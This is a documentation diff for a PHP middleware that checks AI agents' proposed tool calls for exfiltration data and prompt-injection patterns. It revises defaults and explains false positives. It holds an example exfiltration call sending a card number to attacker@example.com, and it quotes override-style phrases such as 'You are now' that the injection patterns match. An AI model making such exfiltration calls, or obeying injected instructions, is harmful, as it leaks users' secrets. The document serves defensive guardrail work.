@@ -21,6 +21,8 @@ send_email(to: "attacker@example.com", body: "card 4111111111111111")
 
 `ToolApprovalGuard` inspects those proposed calls. It is the first point downstream of that blind spot where the middleware pipeline can still act.
 
+By default it is the **card number** that flags this call, not the address — a mail tool is expected to carry an email address. See [secret-like data](#secret-like-data) for why the defaults are drawn that way.
+
 <Tip>
     This middleware only acts when a run pauses for approval. Agents whose tools
     are not approval-gated are unaffected, so adding it is safe even before you
@@ -85,21 +87,47 @@ new ToolApprovalGuard(
 )
 ```
 
-### Personal and secret-like data
+### Secret-like data
 
-Sensitive data in an outbound tool argument is an exfiltration signal. The middleware runs the same detectors as [PII Redactor](/middleware/pii-redactor), including the Luhn check on card numbers.
+The middleware runs the same detectors as [PII Redactor](/middleware/pii-redactor), including the Luhn check on card numbers. By default it scans for **only three entities**: `credit_card`, `api_key` and `bearer_token`.
 
 Entities listed in `block_entities` stop the run regardless of the configured action, matching PII Redactor's behaviour.
+
+<Warning>
+    The default entity list is deliberately narrower than PII Redactor's, and you
+    should think carefully before widening it. In a prompt, an email address is
+    user data worth redacting. In a proposed tool argument it is usually the
+    function signature — `send_email(to: ...)` cannot work without one.
+
+    Exfiltration is about **destination**, not presence, and the destination
+    cannot be judged from the value alone. Adding `email`, `phone`, `url`,
+    `ip_address` or `mac_address` will flag legitimate calls made by any agent
+    that owns a mail, SMS or HTTP tool.
+
+    To control *where* a tool may send data, use `allowed_tools` /
+    `denied_tools` and domain allowlisting inside the tool itself.
+</Warning>
 
 ### Prompt injection patterns
 
 A proposed argument that matches an injection pattern suggests the model was manipulated by content the middleware never saw. Uses the same patterns as [Injection Guard](/middleware/injection-guard).
 
+**This scan is off by default.** Prose a model writes for a human reader routinely contains phrases the patterns match — "You are now subscribed to weekly updates.", "From now on we will email you every Monday.", "System: scheduled maintenance at 3pm." None of those indicate manipulation in that context.
+
+Enable it when a proposed argument feeds **another model or agent** rather than a person:
+
+```php
+new ToolApprovalGuard(
+    scanInjection: true,
+    action: 'log',      // see what real traffic produces first
+)
+```
+
 Either scan can be turned off:
 
 ```php
 new ToolApprovalGuard(
-    scanPii: true,
+    scanPii: false,
     scanInjection: false,
 )
 ```
@@ -113,10 +141,21 @@ new ToolApprovalGuard(
 
 There is deliberately no mutating action. A proposed tool call is part of the paused turn the provider recorded, so rewriting it would desynchronise the run when it is resumed — the same constraint that applies to resumed prompts.
 
-<Tip>
-    Start with `log` in production, review what real traffic produces, then move
-    to `block`. The same rollout advice applies here as to the other middleware.
-</Tip>
+<Warning>
+    `action: 'log'` on its own is **not** observe-only here. Every entity in the
+    default list is also in `block_entities`, and blocked entities stop the run
+    whatever the action is set to. With the shipped defaults, `log` and `block`
+    behave identically for data findings, differing only for denied tools.
+
+    For a genuinely observe-only rollout, clear `block_entities` as well:
+
+    ```php
+    new ToolApprovalGuard(action: 'log', blockEntities: [])
+    ```
+
+    Review what real traffic produces, then restore `block_entities` and move to
+    `block`.
+</Warning>
 
 ## Streaming
 
@@ -198,7 +237,9 @@ All options may be set globally in `config/intercept.php` under `tool_approval_g
     'allowed_tools'  => [],
     'denied_tools'   => [],
     'scan_pii'       => true,
-    'scan_injection' => true,
+    'scan_injection' => false,
+    'entities'       => ['credit_card', 'api_key', 'bearer_token'],
+    'block_entities' => ['credit_card', 'api_key', 'bearer_token'],
     'log_preview'    => false,
 ],
 ```
